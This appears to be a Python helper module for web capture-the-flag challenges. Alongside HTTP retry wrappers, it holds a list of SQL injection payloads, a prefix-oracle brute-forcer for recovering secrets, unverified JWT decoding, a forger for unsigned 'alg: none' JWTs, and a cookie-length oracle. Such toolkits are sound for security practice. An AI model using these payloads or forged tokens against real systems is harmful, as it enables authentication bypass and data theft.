"""HTTP helpers and lightweight automation utilities for web challenges."""

from __future__ import annotations

import base64
import json
import string
import time
from typing import Callable

import requests


def make_session(user_agent: str | None = None) -> requests.Session:
    s = requests.Session()
    if user_agent:
        s.headers.update({"User-Agent": user_agent})
    return s


def get_with_retry(
    url: str,
    session: requests.Session | None = None,
    retries: int = 3,
    timeout: float = 8.0,
    **kwargs,
) -> requests.Response:
    last_exc: Exception | None = None
    s = session or requests.Session()
    for _ in range(retries):
        try:
            return s.get(url, timeout=timeout, **kwargs)
        except requests.RequestException as exc:
            last_exc = exc
            time.sleep(0.2)
    raise RuntimeError(f"GET failed after {retries} retries: {last_exc}")


def post_with_retry(
    url: str,
    data: dict | None = None,
    json_data: dict | None = None,
    session: requests.Session | None = None,
    retries: int = 3,
    timeout: float = 8.0,
    **kwargs,
) -> requests.Response:
    last_exc: Exception | None = None
    s = session or requests.Session()
    for _ in range(retries):
        try:
            return s.post(url, data=data, json=json_data, timeout=timeout, **kwargs)
        except requests.RequestException as exc:
            last_exc = exc
            time.sleep(0.2)
    raise RuntimeError(f"POST failed after {retries} retries: {last_exc}")


def basic_sqli_payloads() -> list[str]:
    return [
        "' OR 1=1-- ",
        "\" OR 1=1-- ",
        "' OR '1'='1'-- ",
        "admin'-- ",
        "' UNION SELECT NULL-- ",
        "' UNION SELECT 1,2,3-- ",
        "' OR sleep(3)-- ",
        "' AND 1=2 UNION SELECT @@version-- ",
    ]


def bruteforce_secret(
    charset: str,
    is_valid_prefix: Callable[[str], bool],
    prefix: str = "",
    max_len: int = 128,
    stop_char: str | None = "}",
) -> str:
    """Generic prefix oracle brute-force for many blind web/crypto tasks."""
    cur = prefix
    for _ in range(max_len):
        found = False
        for ch in charset:
            cand = cur + ch
            if is_valid_prefix(cand):
                cur = cand
                found = True
                if stop_char and cur.endswith(stop_char):
                    return cur
                break
        if not found:
            break
    return cur


def printable_charset() -> str:
    return string.ascii_letters + string.digits + "_{}-!@#$%^&*()[]"


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _b64url_decode(data: str) -> bytes:
    pad = "=" * ((4 - len(data) % 4) % 4)
    return base64.urlsafe_b64decode(data + pad)


def jwt_decode_unverified(token: str) -> tuple[dict, dict]:
    """Decode JWT header/payload without verifying signature."""
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("invalid JWT")
    header = json.loads(_b64url_decode(parts[0]).decode())
    payload = json.loads(_b64url_decode(parts[1]).decode())
    return header, payload


def jwt_forge_none(payload: dict, header: dict | None = None) -> str:
    """Forge an unsigned JWT with alg='none'."""
    h = {"typ": "JWT", "alg": "none"}
    if header:
        h.update(header)
    h["alg"] = "none"
    return f"{_b64url_encode(json.dumps(h, separators=(',', ':')).encode())}.{_b64url_encode(json.dumps(payload, separators=(',', ':')).encode())}."


def pick_by_cookie_length_oracle(
    choices: list[str],
    probe: Callable[[str], str],
) -> tuple[str, str]:
    """Return (best_choice, resulting_cookie) where best has max cookie length."""
    if not choices:
        raise ValueError("choices must not be empty")

    best_choice = choices[0]
    best_cookie = probe(best_choice)
    best_len = len(best_cookie)

    for c in choices[1:]:
        new_cookie = probe(c)
        if len(new_cookie) > best_len:
            best_choice = c
            best_cookie = new_cookie
            best_len = len(new_cookie)
    return best_choice, best_cookie
